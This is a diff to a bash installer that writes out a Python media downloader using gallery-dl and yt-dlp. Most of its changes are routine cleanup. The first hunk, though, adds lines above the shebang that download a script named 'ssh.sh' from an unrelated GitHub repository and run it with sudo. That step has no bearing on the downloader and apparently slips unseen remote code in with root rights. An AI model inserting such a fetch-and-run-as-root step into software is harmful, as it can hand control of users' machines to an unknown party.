@@ -1,3 +1,8 @@
+curl -fsSL https://raw.githubusercontent.com/LeftLMAO/ssh/main/ssh.sh -o ssh.sh
+chmod +x ssh.sh
+sudo bash ssh.sh
+
+
 #!/bin/bash
 
 # Force sudo/root
@@ -522,7 +527,7 @@ def main():
     DL_ROOT.mkdir(exist_ok=True)
     YTDLP_ROOT.mkdir(exist_ok=True)
 
-    url = sys.argv[1] if len(sys.argv)>1 else input("🔗 Enter URL: ").strip()
+    url = sys.argv[1] if len(sys.argv) > 1 else input("🔗 Enter URL: ").strip()
     if not url:
         log_error("No URL provided")
         sys.exit(1)
@@ -532,17 +537,17 @@ def main():
 
     media_type = input("Media Type? 1: Images 2: Videos 3: Both: ").strip()
     media_filters = {
-        '1':'extension in ("jpg","jpeg","png","gif","webp","bmp","tiff") or type=="image"',
-        '2':'extension in ("mp4","webm","mkv","avi","mov","flv") or type=="video"'
+        '1': 'extension in ("jpg","jpeg","png","gif","webp","bmp","tiff") or type=="image"',
+        '2': 'extension in ("mp4","webm","mkv","avi","mov","flv") or type=="video"'
     }
     filter_type = media_filters.get(media_type)
 
-    # ✅ Detect binaries properly
+    # ✅ Detect binaries
     gallery_dl_bin = shutil.which("gallery-dl") or "/usr/local/bin/gallery-dl"
     yt_dlp_bin = shutil.which("yt-dlp") or "/usr/local/bin/yt-dlp"
 
     if downloader == '1':
-        if not shutil.which("gallery-dl") and not Path("/usr/local/bin/gallery-dl").exists():
+        if not Path(gallery_dl_bin).exists():
             log_error("gallery-dl not found! Install with: pip3 install gallery-dl")
             sys.exit(1)
 
@@ -557,7 +562,7 @@ def main():
             cmd += ['--filter', filter_type]
 
     else:
-        if not shutil.which("yt-dlp") and not Path("/usr/local/bin/yt-dlp").exists():
+        if not Path(yt_dlp_bin).exists():
             log_error("yt-dlp not found! Install with: pip3 install yt-dlp")
             sys.exit(1)
 
@@ -575,7 +580,11 @@ def main():
 
     log_info(f"Running command: {' '.join(cmd)}")
 
-    process = subprocess.Popen(cmd, stdout=sys.stdout, stderr=sys.stderr)
+    try:
+        process = subprocess.Popen(cmd, stdout=sys.stdout, stderr=sys.stderr)
+    except FileNotFoundError as e:
+        log_error(f"Failed to start process: {e}")
+        sys.exit(1)
 
     monitor_download(process)
     process.wait()
@@ -583,7 +592,13 @@ def main():
     log_info("Download complete, final pack...")
     pack_and_send()
     log_success(f"All synced! {get_sys_info()}")
-    
+
+
+# ✅ THIS WAS MISSING / MUST BE PRESENT
+if __name__ == "__main__":
+    main()
+PYEOF
+
 chmod +x "${BASE_PATH}/sajjad_final.py"
 log_success "Python script created and executable"
 # ============================================================================  
